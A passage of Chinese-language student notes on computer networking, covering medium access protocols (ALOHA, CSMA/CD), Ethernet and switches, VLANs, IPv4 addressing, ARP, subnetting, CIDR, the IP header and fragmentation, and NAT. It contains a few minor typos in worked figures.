class="markdownIt-Anchor" href="#信道划分-fdma"></a> 信道划分-FDMA</h5><p>信道的频谱划分为不同的频段</p><p>每个节点使用固定的频段发送数据</p><p>未发送的节点保持闲置</p><h5 id="随机接入"><a class="markdownIt-Anchor" href="#随机接入"></a> 随机接入</h5><ul><li>“随机”：有一个节点需要发送数据时就占满带宽全速发送，不需要经过节点之间的协调。</li><li>“碰撞”：当多个节点发送数据，则会导致碰撞。</li><li>协议：主要用来侦测是否发生碰撞以及如何从碰撞中恢复。</li></ul><h6 id="slotted-aloha"><a class="markdownIt-Anchor" href="#slotted-aloha"></a> Slotted ALOHA</h6><p>是一个七十年代提出的早期协议，十分简单</p><p>基本假设：</p><ul><li>所有帧大小一致</li><li>时间轴被划分为等长的时隙（slots），每个时隙的长度通常是传递一帧的时间</li><li>节点均只在时隙开始时进行传输</li><li>若超过两个节点在同一时隙传输数据，则所有节点均能检测到碰撞</li></ul><p>操作：</p><ul><li>当一个节点获得一个新的帧时，在下一个时隙开始传输：<ul><li>若没有碰撞，则数据传输成功</li><li>若发生碰撞，则传输失败，该节点在之后的每一个时隙以概率p进行重传，直至传输成功。</li></ul></li></ul><p>优点：</p><ul><li>每个时隙中，都有一个节点可以一直进行全速传输</li><li>高度分布式算法：只需要把多有节点的时隙进行同步，其余工作都由节点自行探测解决</li><li>算法十分简单</li></ul><p>缺点：</p><ul><li>碰撞会浪费很多时隙，也有很多时隙是闲置的</li><li>需要一个时隙去检测是否发生碰撞，然而节点检测碰撞只需要更少的时间</li><li>需要时钟同步</li></ul><h6 id="csma协议家族"><a class="markdownIt-Anchor" href="#csma协议家族"></a> CSMA协议家族</h6><ul><li>CSMA: Carrier Sense Multiple Access 载波监听多点接入</li><li>发送数据前先监听广播信道，如果信道空闲则发送整个帧；如果正忙，则延迟发送</li><li>类比“不打扰他人说话”</li></ul><p>此处主要讲述CSMA/CD（Collision Detection 碰撞检测）</p><ul><li>短时间内侦测是否发生碰撞，如碰撞发生则停止传输</li><li>只能在IEEE 802.3 有线局域网使用</li><li>无线局域网不适用，在无线网中很难通过信号强度判定碰撞是否发生</li></ul><p>碰撞检测就是计算机边发送数据边监测信道上的信号电压大小，当几个节点同时传输数据时，信号电压摆动会增大（互相叠加），当一个站检测到信号电压摆动值超过一定的门槛后，就认为发送了碰撞，然后就会暂停发送数据，等待一段随机的时间后再进行发送。</p><p>最先发送数据的站，在经过2τ的争用期内才能检测到碰撞。现在一般把争用期设定为51.2us，对应传输的数据长度为64byte。</p><p>也就是说，只要前64byte没有发生碰撞，该帧后续的传输也不会发生碰撞。</p><p>终止发送后，网卡NIC进入<strong>二进制指数退避</strong>（binary exponential backoff）</p><ul><li>基本退避时间为2τ</li><li>若已经经过m次重传，则随即从整数集合{0,1,…,2<sup>m</sup>-1}中随机选择一个数，定为k。重传所需时延即为k倍的试用期。</li><li>重传16次仍然不能成功，则丢弃该帧，并向更高层协议报告。</li></ul><p>CSMA/CD效率比Slotted ALOHA更高，简单，便宜，完全去中心化。</p><h5 id="受控接入"><a class="markdownIt-Anchor" href="#受控接入"></a> 受控接入</h5><h6 id="taking-turns-轮流接入"><a class="markdownIt-Anchor" href="#taking-turns-轮流接入"></a> Taking turns 轮流接入</h6><p>轮询 polling：</p><ul><li>主节点master邀请次节点slave node轮流发送数据</li><li>典型场景：次节点不具备智能，是dumb service</li><li>存在的问题：<ul><li>轮询开销</li><li>延迟</li><li>单点故障（即master节点一故障，所有系统都瘫痪）</li><li>存在政治正确问题</li></ul></li></ul><p>令牌传递 token passing：</p><ul><li>受控的令牌从一个节点依次传递到下一个节点</li><li>有令牌的节点可以发送帧</li><li>存在的问题：<ul><li>开销</li><li>延迟</li><li>单点故障（令牌本身被黑客替换，所有系统瘫痪）</li></ul></li></ul><h3 id="链路层的寻址"><a class="markdownIt-Anchor" href="#链路层的寻址"></a> 链路层的寻址</h3><h4 id="mac地址"><a class="markdownIt-Anchor" href="#mac地址"></a> MAC地址</h4><p>即Media Access Control，也称为局域网地址、硬件地址、物理地址、以太网地址</p><p>一共48位（6字节），通常烧录进NIC的ROM中，有时候也可以通过软件设定</p><p>注意：并不是一台电脑或者一台路由器/交换机只有一个Mac地址，Mac地址是端口绑定的</p><p>前3字节用于组织唯一标识符，后3字节用于拓展唯一标识符，由厂家指派，必须保证生产出的适配器没有重复地址。</p><h4 id="nic检查mac地址"><a class="markdownIt-Anchor" href="#nic检查mac地址"></a> NIC检查Mac地址</h4><p>适配器从网络上收到每一个Mac帧就首先会用硬件检查Mac帧中的Mac地址。如果是发往本站的帧，就收下，反之就将此帧丢弃。</p><p>发往本站的帧有以下三种：</p><ul><li>单播帧（一对一）</li><li>广播（一对全体）</li><li>多播（一对多）</li></ul><h2 id="以太网ethernet"><a class="markdownIt-Anchor" href="#以太网ethernet"></a> 以太网（Ethernet）</h2><p>以太网是现在事实上的主流有线局域网技术</p><ul><li>单一芯片，可以实现多种带宽</li><li>第一个广泛采用的局域网技术</li><li>简单便宜速度快</li></ul><p>以太网过去采用<strong>总线拓扑</strong>，所有节点处于同一碰撞域。现在使用星型拓扑，采用交换机。</p><h3 id="以太网的帧结构"><a class="markdownIt-Anchor" href="#以太网的帧结构"></a> 以太网的帧结构</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230915103251.png" alt="img" /></p><p><strong>preamble：</strong></p><p>一共八个字节，用于实现Mac帧的比特同步，以及界定Mac帧的开始。</p><p><strong>dest address/source address</strong>：</p><p>各自6字节的Mac地址。如果NIC收到的帧目的地址匹配自己的Mac地址，或者收到广播地址，就把帧传输至上一层网络层协议。</p><p><strong>type：</strong></p><p>表示“上一层协议”，即收到帧后应该传给网络层的哪一种协议。多数情况下是IP协议，也有可能有其他的IP层协议。</p><p><strong>CRC：</strong></p><p>4字节的CRC校验码。若检查出错误，直接丢弃该帧，不进行重传。</p><p>传输时可能会遇到无效的帧，有以下几种情况：</p><ul><li>帧的长度不是整数字节</li><li>CRC校验失败</li><li>数据字段长度不在46~1500字节之间</li><li>MAC帧长度不在64~1518字节之间</li></ul><p>检查出无效的Mac帧就直接丢弃，以太网不负责重传丢弃的帧。</p><h3 id="不可靠-无连接的以太网"><a class="markdownIt-Anchor" href="#不可靠-无连接的以太网"></a> 不可靠、无连接的以太网</h3><ul><li><p>无连接：发送和接收的NIC不需要握手进行连接</p></li><li><p>不可靠：接受的NIC不需要想发送的NIC表达是否接收到帧。</p><p>若帧被丢弃，则只能通过上层协议恢复，否则直接丢弃，数据丢失。</p><p>Ethernet用到的信道复用协议是unslotted CSMA/CD with binary backoff</p></li></ul><h2 id="交换机"><a class="markdownIt-Anchor" href="#交换机"></a> 交换机</h2><h3 id="为什么使用交换机"><a class="markdownIt-Anchor" href="#为什么使用交换机"></a> 为什么使用交换机</h3><p>主要用于拓展以太网，将不同的网络连接在一起。</p><p>交换机是链路层设备，它储存并转发以太网帧，并且检查收到帧的Mac地址，选择性地将它转发到多个链路。</p><p>交换机是透明的，主机不知道交换机存在。</p><p>交换机即插即用，自学习，不需要进行手动配置，它将自动学习网络拓扑。</p><p>交换机可以实现无碰撞的传输数据，碰撞区域被局限在交换机的每一个借口。</p><h3 id="交换机的特点"><a class="markdownIt-Anchor" href="#交换机的特点"></a> 交换机的特点</h3><ul><li>交换机有十几个或者更多的接口</li><li>交换机有并行性，能同时对接多接口，使多对主机同时通信</li><li>交换机接口有储存器，能在输出繁忙时将到来的帧进行缓存</li><li>交换机使用专用的交换结构芯片，使用硬件转发，转发速率非常的高</li><li>交换机的性能远远超过普通的集线器，而且价格不贵</li></ul><h3 id="交换表转发表-forwarding-table"><a class="markdownIt-Anchor" href="#交换表转发表-forwarding-table"></a> 交换表/转发表 forwarding table</h3><p>每一个交换机有一个交换表，交换表上有：主机的Mac地址，通过哪个接口访问，有效时间。表的内容创立于维护通过交换机的自学习功能进行。</p><p>当交换机收到帧时，交换机会记录帧的来源Mac地址和目的地Mac地址，之后在交换表中查找。</p><p>若交换表中有对应的地址，则继续进行判断：</p><ul><li>若目的地和帧的来源一样，则丢弃该帧</li><li>若不一样，则发送数据</li></ul><p>若没有找到对应的条目，则进行<strong>泛洪</strong>。即将数据从除了进来的接口外的所有接口转发该帧。</p><h3 id="以太网交换机的自学习功能"><a class="markdownIt-Anchor" href="#以太网交换机的自学习功能"></a> 以太网交换机的自学习功能</h3><p>开始时，表中的内容是空的。</p><p>首先A使用接口1向B发送一帧，那么交换机首先会把接口1和帧的原地址A记录在表中。随后查找交换表，查找不到应该从哪个接口转发数据给B，接着进行泛洪，向除了接口1外的所有接口广播该帧。</p><p>由于该帧与目的地不同，C和D将丢弃该帧，而B收到信息。</p><p>若B向A发送一帧，交换机先重复和A一样的工作记录B使用的接口和地址，随后查找交换表。这一次查找到了A的接口和Mac地址，所以直接发送数据而无须进行泛洪。</p><p>考虑到交换机的接口可能会更换主机或者网络适配器，所有每一个交换机项目都有一定的有效时间。国旗的项目会被自动删除。</p><p>这种自学习的方法使得交换机能够即插即用，不用进行人工配置，所以十分方便。</p><h2 id="虚拟局域网"><a class="markdownIt-Anchor" href="#虚拟局域网"></a> 虚拟局域网</h2><h3 id="vlan的定义"><a class="markdownIt-Anchor" href="#vlan的定义"></a> VLAN的定义</h3><p>假如CS用户把办公室移到了EE系的楼，但是仍然希望连接CS系的局域网。如果只采用一个广播域，那么所有的链路层流量都需要经过整个局域网，带来了安全、隐私和效率问题。</p><p>虚拟局域网 VLAN 是由一些局域网网段构成的与物理位置无关的逻辑组，而这些网段具有某些共同的需求。每一个 VLAN 的帧都有一个明确的标识符，指明发送这个帧的计算机是属于哪一个 VLAN。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230922085116.png" alt="img" /></p><p>由上图所示，在没有VLAN时，只有每一层的主机能构成局域网，如果想要通过主机向其他局域网发送消息，那么第一次发送肯定要经过泛洪发送给其他无关成员。但如果使用了VLAN，使得发送的帧带上了特定标识符，让数据直接到达目标主机。</p><p>特定的标志符将以4字节的形式插入以太网的帧结构中，即802.1Q帧。</p><h2 id="网络层数据平面和控制平面"><a class="markdownIt-Anchor" href="#网络层数据平面和控制平面"></a> 网络层/数据平面和控制平面</h2><p>网络层的作用是从发送端到接收端传递数据段。在发送端将数据包装成数据报，在接收端将数据报解包然后传送到传输层。每个主机/端/路由都需要部署网络层（交换机排除在外，属于链路层）。在传输数据报时，由路由器检查数据报的首部，并决定使用什么路径发送IP数据报。</p><p>现在的互联网是“无连接”，“尽最大努力的”。即网络层向上只提供简单的、无连接的、尽最大努力交付的数据报服务。发送分组时不需要先建立连接，不提供服务质量的承诺。</p><p>如果主机中的进程之间的通信需要可靠，那么就由主机中的运输层负责可靠交付（差错处理，流量控制）。这样使得网络的造价大大降低。</p><p>一般来说，我们把基于单个本地路由器，只负责转发的平面称为数据平面；而作用于整个网络连接，负责路由的平面称为控制平面。</p><h2 id="路由器基础"><a class="markdownIt-Anchor" href="#路由器基础"></a> 路由器基础</h2><p>这一节太抽象了（很多图且全英），建议直接去看PPT。</p><h2 id="ip协议"><a class="markdownIt-Anchor" href="#ip协议"></a> IP协议</h2><p>网际协议IP是TCP/IP协议中最主要的两个协议之一。</p><p>如果我们只从网络层考虑问题，那么我们就可以把IP数据报看成只在网络层传输。</p><p>我们把互联网看成一个单一的、抽象的网络。IP地址就是给每个连接在互联网上的主机（或者路由器）分配一个在全世界范围内是唯一的32位标识符。一般用形如X.X.X.X的方式表示，每个X对应8位的二进制数。</p><h3 id="ip地址的分类"><a class="markdownIt-Anchor" href="#ip地址的分类"></a> IP地址的分类</h3><p>我们将每一个IP地址划分为固定的类，每一类地址都由两个固定长度的字段组成，其中一个字段是网络号net-id，它标志主机（或路由器）所连接到的网络，而另一个字段则是主机号host-id，它标志该主机（或路由器）。主机号在它前面的网络号所指明的网络范围内必须是唯一的。</p><p>由此可见，一个IP地址在整个互联网范围内唯一。</p><p>IP地址指向的是一个网络范围，也就是说它会随着主机的位置改变而发生改变，而MAC地址则是唯一的，指向一台具体的设备，不随位置的改变而改变。</p><p>每个IP地址的分类网络号和主机号占的位数可能不一样，但是总的一定是32位。</p><p>一般来说有以下几种分类：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230922104215.png" alt="img" /></p><p>我们对于IP地址的书写采用点分十进制，实际上就是将机器中存放的32位二进制IP地址代码每8位位一组取出，然后将其转换为十进制数，再加上点。</p><p>如：10000000 00001011 00000011 00011111</p><p>转化为128.11.3.31</p><p>知道这些后，我们就可以算出上图中ABC三种IP地址的指派范围。</p><table><thead><tr><th>网络类别</th><th>最大可指派网络数</th><th>第一个可指派的网络号</th><th>最后一个可指派的网络号</th><th>每个网络中最大主机数</th></tr></thead><tbody><tr><td>A</td><td>126（2<sup>7</sup>-2）</td><td>1</td><td>126</td><td>16777214</td></tr><tr><td>B</td><td>16383（2<sup>14</sup>-1）</td><td>128.1</td><td>191.255</td><td>65534</td></tr><tr><td>C</td><td>2097151（2<sup>21</sup>-1）</td><td>192.0.1</td><td>223.255.255</td><td>254</td></tr></tbody></table><p>这里还有一些一般不使用的特殊IP地址</p><table><thead><tr><th>网络号</th><th>主机号</th><th>源地址使用</th><th>目的地址使用</th><th>代表的意思</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>可以</td><td>不可</td><td>在本网络上的本主机</td></tr><tr><td>0</td><td>host-id</td><td>可以</td><td>不可</td><td>在本网络上的某台主机</td></tr><tr><td>全1</td><td>全1</td><td>不可</td><td>可以</td><td>只在本网络上进行广播（各路由器不进行转发）</td></tr><tr><td>net-id</td><td>全1</td><td>不可</td><td>可以</td><td>对net-id上的所有主机进行广播</td></tr><tr><td>127</td><td>非全0或全1的任何数</td><td>可以</td><td>可以</td><td>用与本地软件环回测试</td></tr></tbody></table><h3 id="ip地址的一些重要特点"><a class="markdownIt-Anchor" href="#ip地址的一些重要特点"></a> IP地址的一些重要特点</h3><ul><li>IP地址是一种分等级的地址结构。IP地址管理机构只分配网络号，主机号则由网络号单位自行分配，方便了IP地址的管理。路由器仅由目的主机所连接的网络号来转发分组，这样就使得路由表中的项目书大为减少，减少了路由表的储存空间</li><li>实际上IP地址是标志一个主机（或者路由器）和一条链路的接口。一个主机同时连接到两个网络时，就具有两个IP地址，网络号id-net必定不同。这种主机称为多归属主机而路由器则必须至少连接两个网络，才能将IP数据报从一个网络转发至另一个网络，故路由器至少有两个IP地址</li><li>用交换机连接起来的局域网仍为一个网络，局域网具有相同的网络号net-id</li></ul><p>切记IP地址与硬件地址是不同的。</p><p>IP地址最大的作用在于：IP层抽象的互联网隐藏了下层很复杂的细节（如MAC地址的流动）。在抽象的网络层上讨论问题，就能够使用统一的、抽象的IP地址，研究主机和主机或者主机和路由器之间的通信。</p><h3 id="为什么不直接使用硬件地址进行通信"><a class="markdownIt-Anchor" href="#为什么不直接使用硬件地址进行通信"></a> 为什么不直接使用硬件地址进行通信？</h3><ul><li>世界的各个设备硬件地址存在着很多差异，使用硬件地址并将他们转换为统一的格式几乎不可能做到</li><li>连接互联网的主机要求其拥有一个唯一的地址，要确保硬件地址唯一极其困难，而使用由软件生成的虚拟IP地址则方便许多</li></ul><h3 id="arp协议"><a class="markdownIt-Anchor" href="#arp协议"></a> ARP协议</h3><p>我们知道一台主机的IP地址，但我们要如何获取它的MAC地址呢？所以我们需要ARP协议。它主要包括以下内容：</p><ul><li>网络层每一个节点（主机、路由、交换机……）中都储存着一张ARP表，里面有着IP地址和MAC地址的映射。</li><li>经过每一轮TTL（类似于DDL，一般20分钟左右）后，表中的内容会被遗忘</li></ul><p>一般来说，在同一局域网内，ARP协议是这么运作的：</p><ul><li>A发送数据报给B，假设A的ARP表中没有B的MAC地址。即A在网络层知道B的位置，但是链路层不知道</li><li>A发送广播ARP查询<strong>packet</strong>，包含B的IP地址<ul><li>该packet的目的MAC地址是FF-FF-FF-FF-FF-FF（广播）</li><li>局域网中所有节点都收到该查询</li></ul></li><li>B收到了该查询，并发送自身的MAC地址给A，此时是<strong>单播</strong>，即直接发送给A的MAC地址</li><li>A更新ARP表，直到信息过时</li><li>ARP协议是即插即用的，类似于交换机的过程</li></ul><h2 id="子网划分"><a class="markdownIt-Anchor" href="#子网划分"></a> 子网划分</h2><h3 id="为什么要划分子网"><a class="markdownIt-Anchor" href="#为什么要划分子网"></a> 为什么要划分子网？</h3><p>在ARPANET早期，IP地址划分不够合理。</p><ul><li>IP地址利用率低</li><li>给每一个物理网络分配一个网络号会使得路由表太大而网络性能变坏</li><li>两级的IP地址不够灵活&lt;网络号、主机号&gt;</li></ul><p>于是我们引入了子网，即三级的IP地址&lt;网络号，子网号，主机号&gt;</p><h3 id="划分子网的思路"><a class="markdownIt-Anchor" href="#划分子网的思路"></a> 划分子网的思路</h3><p>划分子网纯属一个单位内部的事情，对外IP地址仍然表示为普通的二级IP地址</p><p>主要方法就是从原先的主机号中借用若干个位作为子网号subnet-id，而主机号host-id也就减少了相应的若干个位</p><p>凡是从其他网络发送给本单位的某个主机的IP数据报，仍然是根据IP数据报的目的网络号net-id，先找到连接在本单位上的路由器。然后该路由器在收到IP数据报后，再按照目的网络号和子网号找到目的子网。最后IP数据报就直接交付给目的主机。</p><h4 id="优点"><a class="markdownIt-Anchor" href="#优点"></a> 优点</h4><ol><li>减少了IP地址的浪费</li><li>使网络组织更加灵活</li><li>更加便于维护和管理</li></ol><h3 id="子网掩码"><a class="markdownIt-Anchor" href="#子网掩码"></a> 子网掩码</h3><p>我们需要用子网掩码（subnet mask）来判断主机或者目的主机是否进行了子网划分，它能帮我们找到IP地址中的子网部分。</p><p>规则：</p><ul><li>子网掩码长度：32位</li><li>子网掩码左边一连串1，对应于网络号和子网号</li><li>子网掩码右边一连串0，对应主机号</li></ul><p>这样我们通过分析它的子网掩码，再比对网络号和主机号的长度即可得到其子网号的位置。</p><p>我们定义：<strong>IP地址 AND 子网掩码 = 网络地址</strong></p><p>即，将三级IP地址和三级IP地址的子网掩码进行逐位与运算，最后得到的就是子网的网络地址，实际上就是主机号对应的地址被消去全部改为0。</p><p>最后再对二进制地址进行点分十进制转换，即可得到我们熟悉的网络地址。</p><p>路由器在进行通信时，必须要把目的网络地址和子网掩码一起发送出去。若一个路由器连接在两个子网上，那么该路由器就拥有两个网络地址和子网掩码。</p><p>划分子网的方法分为<strong>固定长度子网</strong>和<strong>变长子网</strong>两种。</p><p>当采用固定长度子网时，所有子网的子网掩码都相同。采用划分子网增加了灵活性，却减少了能够连接在网络上的主机数。</p><h2 id="超网cidr"><a class="markdownIt-Anchor" href="#超网cidr"></a> 超网CIDR</h2><p>CIDR，即Classless Inter-Domain Routing，无分类编址</p><h3 id="网络前缀"><a class="markdownIt-Anchor" href="#网络前缀"></a> 网络前缀</h3><p>划分子网一定程度上解决了互联网的困难，但是1992年还是遇到了问题。B类地址即将分配完毕，路由表项目数急剧增长，IPv4的地址空间将全部耗尽。</p><p>于是我们开始使用变长子网掩码VLSM（Variable Length Subnet Mask），进一步提高了IP地址利用率。</p><p>在VLSM的基础上又进一步研究出无分类编址方法，它的正式名称是无分类域间路由选择CIDR（Classless Inter-Domain Routing）</p><h4 id="cidr的特点"><a class="markdownIt-Anchor" href="#cidr的特点"></a> CIDR的特点</h4><p>CIDR消除了传统的A类、B类、C类地址以及划分子网的概念。它使用各种长度的“网络前缀”来代替分类地址中的网络号和子网号。至此，IP地址从三级编址（子网掩码）又回到了两级编址。即&lt;网络前缀&gt;&lt;主机号&gt;</p><h4 id="无分类的两级编址"><a class="markdownIt-Anchor" href="#无分类的两级编址"></a> 无分类的两级编址</h4><p>CIDR使用“斜线记法”，又称为CIDR记法，即在IP地址后面加一个斜线“/”，然后写上网络前缀所占的位数（对应于三级编址中子网编码的1的位数），例如：220.78.168.0/24</p><h4 id="cidr地址块"><a class="markdownIt-Anchor" href="#cidr地址块"></a> CIDR地址块</h4><p>CIDR把网络前缀都相同的连续的IP地址组成“CIDR地址块”。例如128.14.32.0/20是一个地址块，共有2<sup>12</sup>个地址（因为斜线后面的20是网络前缀的位数，一共32位，故后112位是主机号）需要注意的是，全0或全1的主机号一般不使用</p><h4 id="路由聚合route-aggregation"><a class="markdownIt-Anchor" href="#路由聚合route-aggregation"></a> 路由聚合/route aggregation</h4><p>一个CIDR地址块可以表示很多地址，这种地址的聚合就叫做<strong>路由聚合</strong>。它使得路由表中的一个项目可以表示上千个原来传统分类表示的路由。</p><p>路由聚合有利于减少路由器之间的鲈鱼信息交换，从而提高了互联网的性能。因此，路由聚合也被称为<strong>构成超网（supernetting）</strong></p><p>最后，虽然CIDR废弃了子网，但是仍然使用“掩码”这个名词。但不同与子网掩码，比如对于/20地址块，它的掩码就是20个连续的1。</p><h4 id="cidr记法的其他形式"><a class="markdownIt-Anchor" href="#cidr记法的其他形式"></a> CIDR记法的其他形式</h4><ul><li>省略点分十进制中低位连续的0，比如10.0.0.0/10可简写为10/10</li><li>网络前缀的后面加一个星号*，如0000101000*，在星号之前是网络前缀，而星号*表示IP地址中的主机号，可以是任意值。</li></ul><h4 id="构成超网"><a class="markdownIt-Anchor" href="#构成超网"></a> 构成超网</h4><p>前缀长度不超过23位的CIDR地址块都包含了多个C类地址。这些C类地址合起来就构成了超网。且CIDR地址块中的地址个数一定是2的整数幂。</p><p>网络前缀越短，其地址块所包含的网络个数就越多。而在三级结构的IP地址中，划分子网是使网络前缀变长。</p><p>CIDR的优点是可以根据需要分配地址块，从而更好的利用IPv4地址空间。</p><h2 id="ip数据报格式分片与重组"><a class="markdownIt-Anchor" href="#ip数据报格式分片与重组"></a> IP数据报格式+分片与重组</h2><p>*注：以下内容默认为IPv4</p><h3 id="ip数据报的格式"><a class="markdownIt-Anchor" href="#ip数据报的格式"></a> IP数据报的格式</h3><p>IP数据报由首部和数据组成。首部的前一部分是<strong>固定长度</strong>，共<strong>20字节</strong>，是所有IP数据报必须有的格式。首部的固定部分后面是一些可选部分，长度可变。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20231013084732.png" alt="img" /></p><p>每一行32位，对应四个字节。</p><h4 id="ip数据报首部固定部分各字段"><a class="markdownIt-Anchor" href="#ip数据报首部固定部分各字段"></a> IP数据报首部固定部分各字段</h4><h5 id="版本"><a class="markdownIt-Anchor" href="#版本"></a> 版本</h5><p>占4位，即IP协议的版本。目前版本号为4，即IPv4。</p><h5 id="首部长度"><a class="markdownIt-Anchor" href="#首部长度"></a> 首部长度</h5><p>占4位，能够表示的最大长度是15个单位（一个单位4字节），因此IP首部长度最大值也只能是15个单位，即60字节。</p><h5 id="区分服务"><a class="markdownIt-Anchor" href="#区分服务"></a> 区分服务</h5><p>一般情况下不使用，只有在使用区分服务（Diffserv）时才起作用。</p><h5 id="总长度"><a class="markdownIt-Anchor" href="#总长度"></a> 总长度</h5><p>占16位，表示整个IP数据报的长度，即首部和数据之和的长度，数据报最大长度不得超过65535（2<sup>16</sup>-1）字节。**总长度必须不超过最大传送单元MTU。**因此实际传输中一般达不到65535字节，一般是一千字节，被以太网的传输能力限制（不能超过1500字节）。</p><h5 id="标识identification"><a class="markdownIt-Anchor" href="#标识identification"></a> 标识/identification</h5><p>占16位，是一个计数器，用来产生IP数据报的标识。</p><h5 id="标志flag"><a class="markdownIt-Anchor" href="#标志flag"></a> 标志/flag</h5><p>占3位，目前只有前两位有意义。标志字段的最低位是 MF (More Fragment)。MF=1 表示后面“还有分片”。MF=0 表示最后一个分片。标志字段中间的一位是 DF (Don’t Fragment) 。只有当 DF=0 时才允许分片。</p><p>所谓分片，就是如果数据报过长，超出了以太网的传送限制，网络层就需要把数据报分成几份发送，以满足以太网的传输。</p><h5 id="片偏移"><a class="markdownIt-Anchor" href="#片偏移"></a> 片偏移</h5><p>占13位，指出较长的分组在分片后，某片在原分组中的相对位置，片偏移以8个字节为偏移单位。</p><h6 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h6><p>一数据报的总长度为 3820 字节，其数据部分的长度为 3800 字节（使用固定首部），需要分片为长度不超过 1420 字节的数据报片。因固定首部长度为 20 字节，因此每个数据报片的数据部分长度不能超过 1400 字节。于是分为 3 个数据报片，其数据部分的长度分别为 1400、1400 和 1000 字节。<strong>原始数据报首部被复制为各数据报片的首部，但必须修改有关字段的值。</strong></p><p>数据报片1的片偏移为0/8=0</p><p>数据报片2的片偏移为1400/8=175</p><p>数据报片3的片偏移为12800/8=350</p><h5 id="生存时间"><a class="markdownIt-Anchor" href="#生存时间"></a> 生存时间</h5><p>占8位，即为TTL（Time To Live），指示数据报在网络中可通过的路由器数的最大值。每通过一个路由器，TTL就减一，当TTL为0时，路由器将丢弃该数据报。</p><p>设置上限是为了防止数据报在网络中死循环。</p><h5 id="协议-2"><a class="markdownIt-Anchor" href="#协议-2"></a> 协议</h5><p>占8位，指出次数据报携带的数据该使用何种协议，以便目的主机的IP层将数据部分上交给那个处理过程/进程。比如TCP、ICMP、UDP等。</p><h5 id="首部检验和"><a class="markdownIt-Anchor" href="#首部检验和"></a> 首部检验和</h5><p>占16位，只检验数据报的首部，不检验数据部分。这里不采用CRC检验码而采取简单的计算方法，即16位二进制反码求和算法。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20231013100355.png" alt="img" /></p><h5 id="源地址-目的地址"><a class="markdownIt-Anchor" href="#源地址-目的地址"></a> 源地址、目的地址</h5><p>各占4字节。</p><h4 id="ip数据报首部的可变部分"><a class="markdownIt-Anchor" href="#ip数据报首部的可变部分"></a> IP数据报首部的可变部分</h4><p>长度可变，1到40个字节不等，可以实现更多功能，如排错、测量以及安全等措施，但是也会变相的增加路由器处理数据包的开销，实际上这些选项很少被使用。</p><h2 id="网络地址转换"><a class="markdownIt-Anchor" href="#网络地址转换"></a> 网络地址转换</h2><h3 id="为什么需要网络地址转换"><a class="markdownIt-Anchor" href="#为什么需要网络地址转换"></a> 为什么需要网络地址转换？</h3><ul><li>ISP并不需要知道一个范围内的所有地址，很多情况下，知道一个地址指的是多个设备即可</li><li>透明性：可以更改本地设备的IP地址而不需要通知外部世界可以更改ISP而不需要更改本地设备的IP地址</li><li>安全性：本地网络内的设备并不能直接被外界网络访问或可见</li><li>IP地址紧缺</li><li>互联网并不安全，不需要把所有主机接入互联网</li><li>对于一个机构内部的计算机通信，可以使用自行分配的IP地址。</li></ul><h3 id="本地地址与全球地址"><a class="markdownIt-Anchor" href="#本地地址与全球地址"></a> 本地地址与全球地址</h3><p>本地地址：仅在机构内部使用的IP地址，可以由本机构自行分配，而不需要向互联网的管理机构申请</p><p>全球地址：全球唯一的IP地址，必须向互联网的管理机构申请。（域名？）</p><p>问题：在内部使用的本地地址有可能和互联网中的某个IP地址重合，这样就会出现地址的二义性问题。</p><p>解决：RFC 1918中指明了一些<strong>专用地址</strong>。专用地址只能用作本地地址而不能用作全球地址。在互联网中的所有路由器对目的地址是专用地址的数据报一律不进行转发。</p><p><strong>三个专用IP地址块：</strong></p><ol><li><p>10.0.0.0到10.255.255.255</p><p>A类，或记为10.0.0.0/8，又称为24位块</p></li><li><p>172.16.0.0到172.31.255.255</p><p>B类，或记为172.16.0.0/12，又称为20位块</p></li><li><p>192.168.0.0到192.168.255.255</p><p>C类，或记为192.168.0.0/16，又称为16位块</p></li></ol><p>采用这样的专用IP地址的互联网络称为<strong>专用互联网</strong>或<strong>本地互联网</strong>，或者就叫<strong>专用网</strong>。</p><p>因为这些专用地址仅在本机构内部使用，专用IP地址也叫作<strong>可重用地址</strong>（reusable address）</p><h3 id="nat-network-address-translation"><a class="markdownIt-Anchor" href="#nat-network-address-translation"></a> NAT - Network Address Translation</h3><p>基于以上原因，1994年提出了NAT的概念。如果在本地网络的主机要和互联网的其他主机进行通信，我们一般采用网络地址转换NAT。</p><p>NAT实际上是本地网络和互联网中间的媒介。需要在专用网连接到互联网的路由器上安装NAT软件，装有NAT软件的路由器叫做NAT路由器，它至少有一个有效的外部全球IP地址。这样使用本地地址的主机在和外界通信时，都要在NAT路由器上将本地地址转换成全球IP地址，才能和互联网连接。</p><h3 id="nat的两种实现方式"><a class="markdownIt-Anchor" href="#nat的两种实现方式"></a> NAT的两种实现方式</h3><ul><li><p>NAT：纯粹的地址转换，一般不使用</p></li><li><p>NAPT/Network Address and Port Translation</p><p>利用地址加端口进行转换，现实中一般都是用这种，但我们一般都叫NAT，不加上“端口”这个限定。</p></li></ul><h4 id="nat的实现"><a class="markdownIt-Anchor" href="#nat的实现"></a> NAT的实现</h4><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20231013103541.png" alt="img" /></p><p>内部主机A用本地地址IP<sub>A</sub>和互联网上的主机B通信，必须经过NAT路由器。NAT路由器将数据报源地址IP<sub>A</sub>转换为全球地址IP<sub>G</sub>，并把转换结果保存在NAT地址转换表中，目的地址保持不变，然后发送到互联网。在接收到互联网主机B发回的数据报时，NAT再将目的地址IP<sub>G</sub>转换为IP<sub>A</sub>发送给内部主机A。</p><p>这样带来了两个后果：</p><ul><li><p>当NAT路由器具有n个全球地址时，专用网内最多可以同时有n台专用机接入互联网，这样就可以使专用网内数量较多的主机轮流使用NAT路由器数量有限的全球IP地址。</p><p>但是缺点是不能保证很多台主机同时上网。</p></li><li><p>通过NAT路由器的通信必须由专用网内的主机发起。专用网内部不能充当服务器用，因为互联网上的客户不知道专用网内服务器的IP地址。</p><p>这个缺点NAT无法解决。</p></li></ul><h4 id="napt的实现"><a class="markdownIt-Anchor" href="#napt的实现"></a> 